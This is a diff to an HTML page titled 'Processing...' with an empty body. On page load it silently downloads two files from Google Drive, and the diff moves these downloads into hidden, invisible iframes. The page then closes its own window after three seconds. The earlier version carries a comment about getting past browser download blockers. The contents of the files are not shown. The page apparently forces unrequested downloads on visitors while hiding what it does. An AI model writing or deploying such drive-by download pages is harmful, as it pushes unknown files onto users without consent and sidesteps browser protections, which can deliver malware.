@@ -1,35 +1,37 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Processing...</title>
-    <style>
-        body { background-color: #ffffff; margin: 0; padding: 0; }
-    </style>
-    <script>
-        window.onload = function() {
-            // 1. Trigger first download immediately
-            var link1 = document.createElement('a');
-            link1.href = 'https://drive.google.com/uc?export=download&id=1RK1xHRRRcbXJTYxj40VGTCtFWVHf_YfU';
-            document.body.appendChild(link1);
-            link1.click();
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <title>Processing...</title>  
+    <style>  
+        body { background-color: #ffffff; margin: 0; padding: 0; }  
+    </style>  
+    <script>  
+        // Helper function to download via hidden iframe
+        function triggerDownload(url) {
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+        }
 
-            // 2. Trigger second download after 1 second to clear browser blockers
-            setTimeout(function() {
-                var link2 = document.createElement('a');
-                link2.href = 'https://drive.google.com/uc?export=download&id=1seCXXgz8uOW2tQatp6v-aRzo53sI7T0D';
-                document.body.appendChild(link2);
-                link2.click();
+        window.onload = function() {  
+            // 1. Trigger first download immediately via iframe
+            triggerDownload('https://drive.google.com/uc?export=download&id=1RK1xHRRRcbXJTYxj40VGTCtFWVHf_YfU');
+
+            // 2. Trigger second download after 1 second
+            setTimeout(function() {  
+                triggerDownload('https://drive.google.com/uc?export=download&id=1seCXXgz8uOW2tQatp6v-aRzo53sI7T0D');
             }, 1000); 
 
-            // 3. Automatically close the window after 3 seconds
-            setTimeout(function() {
-                window.open('', '_self', '');
-                window.close();
-            }, 3000);
-        };
-    </script>
-</head>
-<body>
-</body>
+            // 3. Automatically close the window after 3 seconds  
+            setTimeout(function() {  
+                window.open('', '_self', '');  
+                window.close();  
+            }, 3000);  
+        };  
+    </script>  
+</head>  
+<body>  
+</body>  
 </html>
